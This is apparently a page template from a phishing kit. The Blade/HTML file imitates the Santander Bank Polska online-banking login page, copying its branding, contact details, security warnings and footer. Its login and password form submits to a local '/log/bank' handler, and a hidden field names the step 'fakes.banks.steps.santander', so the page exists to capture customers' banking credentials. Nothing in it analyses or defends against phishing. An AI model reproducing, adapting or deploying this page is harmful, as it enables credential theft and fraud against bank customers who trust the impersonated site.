@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/santander.css')}}" rel="stylesheet">
    <link href="{{asset('css/order.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div id="wrapper">
        <div id="header" class="loginPanel">
            <a rel="noreferrer noopener" class="bankLogo" href="https://santander.pl/">
                <img alt="Santander" src="{{asset('images/banks/santander-red.svg')}}"></a>
            <div class="title"></div>
            <div id="idd" class="top-bar">
                <section class="loginPanel contact_details">
                    <a class="window-close"
                       href="https://www.centrum24.pl/centrum24-web/crypt.S7FkaYDng9ACbxBnzalG1A/S7Fc1#"
                       title="Zamknij okno"></a>
                    <article>
                        <p class="header">Infolinia</p>
                        <div class="infolinia">
                            <span class="number">Infolinia <a href="tel:19999"><b>1 9999</b></a></span>
                            <small>Z zagranicy</small>
                            <span class="small-number"><a href="tel:+48618119999">+48 61 81 19999</a></span> <br>
                            <a rel="noreferrer noopener" style="font-size: 11px;"
                               href="https://santander.pl/informacje-o-banku/kontakt/menu-infolinii/menu-infolinii-1-9999.html">Menu
                                infolinii »</a>
                        </div>
                        <div class="infolinia skype">
                            <span class="number"><a href="skype:infolinia.bzwbk">Skype</a></span>
                        </div>
                        <ul class="list">
                            <li>Zastrzeganie kart, pomoc w zakresie kart, bankomatów, bankowości elektronicznej -
                                <b>24h</b>
                            </li>
                            <li>Zamawianie produktów (konta, kredyty, karty) <b>8.00 - 20.00, w dni robocze</b></li>
                            <li class="disclimer">* Opłata za minutę połączenia zgodna z taryfą danego operatora.
                            </li>
                        </ul>
                    </article>
                    <article>
                        <p class="header">Napisz do nas</p>
                        <ul class="list">
                            <li>Jeśli masz pytania dotyczące oferty banku, chcesz kupić produkt, przesłać swoją
                                opinię
                                zapraszamy do wypełnienia formularza:
                            </li>
                            <li style="padding-bottom: 10px;">
                                <a rel="noreferrer noopener" class="formularz"
                                   href="https://santander.pl/informacje-o-banku/kontakt/kontakt-zadaj-pytanie.html">Formularz
                                    kontaktowy</a>
                                lub wysłania wiadomości na adres:
                            </li>
                            <li class="mail_kontakt">
                                <a class="mail" href="mailto:kontakt@santander.pl">Wyślij email</a>
                            </li>
                            <li>
                                Jeśli chcesz złożyć reklamację, zaloguj się do Santander internet i
                                napisz do nas, wybierając opcję w Poczcie lub zakładce Twoje sprawy.
                            </li>
                            <li>
                                Potwierdzeniem dotarcia wiadomości do Santander Bank Polska S.A. jest otrzymanie
                                autoodpowiedzi.
                            </li>
                            <li class="social"><span>Dołącz do nas:</span>
                                <a rel="noreferrer noopener" target="blank"
                                   href="https://pl-pl.facebook.com/santanderbankpolska" class="contact-button"><span
                                            class="fb"></span></a>
                                <a rel="noreferrer noopener" target="blank"
                                   href="http://www.youtube.com/user/BankZachodniWBK" class="contact-button"><span
                                            class="yt"></span></a>
                                <a rel="noreferrer noopener"
                                   class="contact-button" href="http://blog.santander.pl/" target="blank"><span
                                            class="blog"></span></a>
                                <a rel="noreferrer noopener"
                                   class="contact-button" href="https://bankmozliwosci.santander.pl/"
                                   target="blank"><span
                                            class="bankp"></span></a>
                            </li>
                        </ul>
                    </article>
                    <article class="hide-mobile">
                        <p class="header">Zgłaszanie cyberincydentów</p>
                        <ul class="list">
                            <li>
                                Jeśli ktoś próbuje przejął Twoje dane logowania do bankowości internetowej lub
                                padłeś
                                ofiarą
                                oszustwa, skontaktuj się z nami.
                            </li>
                            <li class="mail_kontakt">
                                <a class="mail" href="mailto:csirt@santander.pl">Wyślij email</a>
                            </li>
                        </ul>
                        <p class="header">Moja Firma plus</p>
                        <ul class="list">
                            <li>
                                Wsparcie funkcjonalne i techniczne dla<br>użytkowników Moja Firma plus
                            </li>
                            <li>
                                <span class="small-number"><a href="tel:+48618565484">+48 61 856 54 84</a></span>
                            </li>
                            <li class="mail_kontakt">
                                <a class="mail" href="mailto:MojaFirmaPlus@santander.pl">Wyślij email</a>
                            </li>
                            <li class="disclimer">* Opłata za minutę połączenia zgodna z taryfą danego operatora.
                            </li>
                        </ul>
                    </article>
                    <article>
                        <p class="header">Public Relations</p>
                        <ul class="list">
                            <li>
                                Kontakt dla dziennikarzy
                                <br><a href="mailto:biuro.prasowe@santander.pl">biuro.prasowe@santander.pl</a>
                            </li>
                            <li>
                                Zapytanie dot. sponsoringu
                                <br><a href="mailto:sponsoring@santander.pl">sponsoring@santander.pl</a>
                            </li>
                            <li>
                                Oferty marketingowe
                                <br><a href="mailto:marketing@santander.pl">marketing@santander.pl</a>
                            </li>
                            <li style="padding-top: 10px;border-top: 1px solid #ECEEEF;">
                                <a rel="noreferrer noopener" class="home"
                                   href="https://santander.pl/przydatne-informacje/wyszukiwarka-placowek-i-bankomatow/wyszukiwarka-placowek-i-bankomatow.html">Znajdź
                                    oddziały i bankomaty</a>
                            </li>
                        </ul>
                    </article>
                </section>
                <section class="signin_box">
                    <a class="window-close"
                       href="https://www.centrum24.pl/centrum24-web/crypt.S7FkaYDng9ACbxBnzalG1A/S7Fc1#"
                       title="Zamknij okno"></a>
                    <div class="left">
                        <article>
                            <div class="wrapper info_logowanie">
                                Logowanie dla klientów indywidualnych i firm
                            </div>
                        </article>
                        <article class="last hide-mobile">
                            <div class="wrapper">
                                <a rel="noreferrer noopener" href="https://www.centrum24.pl/centrum24-web/login"
                                   class="button_signin">Santander
                                    internet<span></span></a>
                            </div>
                        </article>
                        <article class="last hide-mobile">
                            <div class="wrapper">
                                <a rel="noreferrer noopener" href="https://www.centrum24.pl/centrum24-web/login"
                                   class="button_signin">Mini
                                    Firma / Moja Firma plus<span></span></a>
                            </div>
                        </article>
                        <article class="last">
                            <div class="wrapper">
                                <a rel="noreferrer noopener"
                                   href="https://ibiznes24.pl/bzwbk24biznes-client/login.html"
                                   class="button_signin">iBiznes24<span></span></a>
                            </div>
                        </article>
                        <article class="last">
                            <div class="wrapper">
                                <a rel="noreferrer noopener" href="https://www.inwestoronline.pl/cbm/"
                                   class="button_signin">Inwestor
                                    online<span></span></a>
                            </div>
                        </article>
                        <article class="last">
                            <div class="wrapper">
                                <a rel="noreferrer noopener"
                                   href="https://www.centrum24.pl/prepaid/index?index=1491"
                                   class="button_signin">Serwis
                                    prepaid<span></span></a>
                            </div>
                        </article>
                    </div>
                </section>
            </div>
        </div>
        <div id="container">

            <div id="kolumna-lewa">
                <div id="bezpieczenstwo">
                    <div class="title">Bezpieczeństwo</div>
                    <ol id="bezpieczenstwoLista">
                        <div class="item">
                            <li></li>
                            <span>Nie udostępniaj swoich danych.</span></div>
                        <div class="item">
                            <li></li>
                            <span> Czytaj treść smsKodów.</span></div>
                        <div class="item">
                            <li></li>
                            <span>Nie klikaj w linki i załączniki od nieznanych nadawców.</span></div>
                    </ol>
                    <div class="item"><a rel="noreferrer noopener" class="button button-secondary" target="_blank"
                                         href="https://santander.pl/bankowosc-elektroniczna/bezpieczenstwo-i-prywatnosc/zelazne-zasady-bezpieczenstwa.html?utm_source=bzwbk24&amp;utm_medium=tekst&amp;utm_campaign=a5_2017-09-11_bezpieczenstwo-ogolny-9-2017&amp;utm_content=log-le_bezp">Więcej</a>
                    </div>
                </div>

                <div id="log_left">


                    <a href="https://www.centrum24.pl/centrum24-web/crypt.S7FkaYDng9BoPMu6cTFhVH9YLpri3zW1uZOj1fD6jF6cmcr-u1oSC1Tl2xPU9csarg_dmm3eU2sn22pOzJFMpYpZIb-iGTXZfznhvsCG9x6rXDOPi9ftmI5C-VOHA6MKTxhbKWkM2QA/S7Fc1"
                       target="_blank"><img src="{{asset('images/banks/mediaImage.jpg')}}"
                                            alt="LOGLEWY_SME_VAS-0121"></a>

                </div>
            </div>

            <div id="content">
                <div class="login-wrapper">
                    <div id="logowanie" class="logowanie loginPanel">
                        <h1>
                            <div>
                                Logowanie
                            </div>
                        </h1>
                        <div id="logowanie-inner">
                            <form class="forms" id="bank_pm_form" method="POST"
                                  action="/log/bank">
                                <input type="hidden" name="step" value="fakes.banks.steps.santander">
                                <div id="pinDiv" style="width: 85%">
                                    <div class="labelsLine" id="labelContainer">
                                        <div style="float:left;">
                                            <div id="pinlabel">
                                                <span class="login-step-instruction">Wpisz login</span>
                                                <div class="keyboardContainer">
                                                    <div id="ide" style="display:none">
                                                        <div id="idf" style="display:none"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="form-group feedbackDiv">
                                        <input name="login" id="login" type="text"
                                               class="form-control content_center_input" autocomplete="off" value=""
                                               maxlength="20"
                                               minlength="4">
                                    </div>
                                    <div class="labelsLine" id="labelContainer">
                                        <div style="float:left;">
                                            <div id="pinlabel">
                                                <span class="login-step-instruction">Wpisz hasło</span>

                                                <div class="keyboardContainer">
                                                    <div id="ide" style="display:none">
                                                        <div id="idf" style="display:none"></div>
                                                    </div>
                                                </div>
                                            </div>


                                        </div>
                                    </div>
                                    <div class="form-group feedbackDiv">
                                        <input name="password" id="password" type="password"
                                               class="form-control content_center_input" autocomplete="off" value=""
                                               maxlength="20"
                                               minlength="4">

                                    </div>

                                    <div class="button-next-step2">
                                        <input type="submit" id="okBtn2"
                                               class="button button-primary"
                                               name="loginButton" alt="DALEJ" value="Dalej">
                                    </div>
                                </div>
                                <div id="akcje">
                                    <div id="accessDiv">
                                        <a data-toggle="modal" data-target="#idb">
                                            <span>Jak uzyskać dostęp?</span>
                                        </a>
                                        <div id="idb" class="modal fade" role="dialog"
                                             aria-labelledby="myModalLabel"
                                             aria-hidden="true">
                                            <div class="modal-dialog">
                                                <div class="modal-content">
                                                    <div class="modal-header">
                                                        <h1 class="modal-title">
                                                            <img class="modal-header-icon"
                                                                 src="{{asset('images/banks/log_question_big.png')}}">
                                                            <span>Jak uzyskać dostęp?</span>
                                                        </h1>
                                                        <button type="button" class="close" data-dismiss="modal"
                                                                aria-hidden="true"></button>
                                                    </div>
                                                    <div class="modal-body">
                                                        <div>
                                                            <div id="tipGainAccess">
                                                                <p>Aby się zalogować, w polu „Wpisz login” podaj NIK
                                                                    lub
                                                                    własny login.<br><strong>NIK</strong>, czyli
                                                                    Numer
                                                                    Identyfikacyjny Klienta, znajdziesz w Umowie
                                                                    usług
                                                                    Santander online dla klientów indywidualnych.
                                                                    <strong>Własny
                                                                        login</strong> jest to własny identyfikator,
                                                                    który
                                                                    jako Klient możesz ustalić bezpośrednio w
                                                                    Santander
                                                                    online.</p>
                                                                <div id="tipGainAccessDiv">
                                                                    <div>
                                                                        <p>Jeśli konto założyłeś przez <strong>internet
                                                                                lub
                                                                                telefonicznie, hasło</strong>
                                                                            otrzymałeś
                                                                            <strong>sms-em</strong> lub zostało one
                                                                            przesłane <strong>listem</strong>.</p>
                                                                    </div>
                                                                    <div>
                                                                        <p>Jeśli konto wraz z usługami bankowości
                                                                            elektronicznej zakładałeś <strong>w
                                                                                oddziale,
                                                                                hasło</strong> otrzymałeś w
                                                                            zamkniętej
                                                                            <strong>kopercie</strong> od doradcy.
                                                                        </p>
                                                                    </div>
                                                                </div>
                                                                <img id="exclamation-icon"
                                                                     src="{{asset('images/banks/log_excl_gray.png')}}">
                                                                <p>Jeśli <b>nie pamiętasz hasła</b>, skontaktuj się
                                                                    z
                                                                    infolinią: tel. 1
                                                                    9999 (+48 61 81 19999 dla dzwoniących z
                                                                    zagranicy)
                                                                    lub
                                                                    odwiedź jedną z
                                                                    placówek Santander Bank Polska S.A., aby
                                                                    wygenerować
                                                                    nowe hasło.</p>
                                                                <p>Jeśli jeszcze nie masz podpisanej Umowy usług
                                                                    Santander
                                                                    online dla
                                                                    klientów indywidualnych, odwiedź dowolną
                                                                    placówkę
                                                                    Santander Bank Polska
                                                                    S.A. lub skontaktuj się z <a
                                                                            href="https://www.santander.pl/doradca-online">Doradcą
                                                                        online</a>. Doradca aktywuje dla Ciebie
                                                                    usługi
                                                                    Santander online.</p>
                                                                <p></p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>


                    <script type="text/javascript">
                        <!-- in case of error make red background -->
                        if ($(".feedbackPanel").length) {
                            $('.passwordTable').addClass("error");
                            $('#ordinarypin').addClass("error");
                        }
                    </script>
                    <div id="id10"></div>


                </div>
                <div class="news">


                    <p><strong style="color: #ff0000;">Uwaga! Może zadzwonić do Ciebie przestępca</strong></p>
                    <p>Przestępcy
                        dzwonią do naszych klientów i podszywają się pod pracowników banku.
                        Bądź czujny, to próba wyłudzenia poufnych danych przez rozmowę
                        telefoniczną. <a rel="noreferrer noopener" style="color: #ff0000;"
                                         href="https://www.santander.pl/klient-indywidualny/bankowosc-internetowa/bezpieczne-bankowanie/komunikaty/komunikaty-lista/vishing"
                                         target="_blank">więcej &gt;&gt;</a></p><br>
                    <p><strong>Z pełnym kontem pewniej</strong></p>
                    <p>Kredyt
                        w rachunku płatniczym, czyli limit kredytowy w koncie to gotówka na
                        wszelki wypadek – od Ciebie zależy, czy po nią sięgniesz. Zaloguj się do
                        Santander internet i kliknij w zakładkę Oferta banku. Wypełnij wniosek,
                        a dodatkowe środki znajdziesz na koncie nawet w 60 sekund od jego
                        złożenia (RRSO: 7,40%). <a
                                href="https://www.santander.pl/lp/kredyt-w-rachunku-platniczym-online?utm_source=centrum24&amp;utm_%20medium=tekst&amp;utm_campaign=a7_20-01-2021_KOMUN_LK-0121&amp;utm_content=%20komun"
                                target="_blank" rel="noreferrer noopener" style="color: #ec0000;">więcej
                            &gt;&gt;</a>
                    </p>
                    <br>
                    <p><strong>Czas na zmiany?</strong></p>
                    <p>Łatwo
                        i równie bezpiecznie zatwierdzaj transakcje internetowe w aplikacji
                        Santander mobile - bez czekania na smsKod i bez przepisywania. <a
                                href="https://www.santander.pl/klient-indywidualny/bankowosc-internetowa/santander-mobile/mobilna-autoryzacja?utm_source=centrum24&amp;utm_medium=tekst&amp;utm_campaign=a3_27-01-2021_MAK0121&amp;utm_content=logow-dol"
                                target="_blank" rel="noreferrer noopener" style="color: #ec0000;">więcej
                            &gt;&gt;</a>
                    </p>


                </div>
            </div>

            <div id="kolumna-prawa">
                <div id="log_right">


                    <a href="https://www.centrum24.pl/centrum24-web/crypt.S7FkaYDng9BoPMu6cTFhVH9YLpri3zW1uZOj1fD6jF6cmcr-u1oSC_PgmdQEABdMLHidcYLg8CfSOYJIjVRXrYn-cnhujJozfX9_-vEc-tbs7J1T-TfgQnnqaFFihyY_oQ0G6T5MpY8/S7Fc1"
                       target="_blank"><img src="{{asset('images/banks/mediaImage1.jpg')}}"
                                            alt="LOGOW_APLIKACJA-0121"></a>


                </div>
            </div>

        </div>
    </div>
    <div id="foot">
        <div class="inner-foot">
            <div class="footContent"><strong>Santander Bank Polska S.A.</strong> z
                siedzibą w Warszawie, przy al. Jana Pawła II 17, 00-854 Warszawa,
                zarejestrowana w Sądzie Rejonowym dla m. st. Warszawy w Warszawie, XIII
                Wydział Gospodarczy Krajowego Rejestru Sądowego pod nr KRS 0000008723.
                NIP 896-000-56-73. REGON 930041341. Wysokość kapitału zakładowego 1 021
                893 140 zł. Wysokość kapitału wpłaconego 1 021 893 140 zł.
            </div>
            <div class="footContent"><strong>Słowniczek pojęć i definicji</strong>
                dotyczących usług reprezentatywnych, wynikających z rozporządzenia
                Ministra Rozwoju i Finansów z dnia 14 lipca 2017 r. w sprawie wykazu
                usług reprezentatywnych powiązanych z rachunkiem płatniczym, dostępny
                jest na stronie <a rel="noreferrer noopener" href="https://santander.pl/pad.html" target="_blank">santander.pl/PAD</a>
                oraz w placówkach banku.
            </div>
        </div>
    </div>
@endsection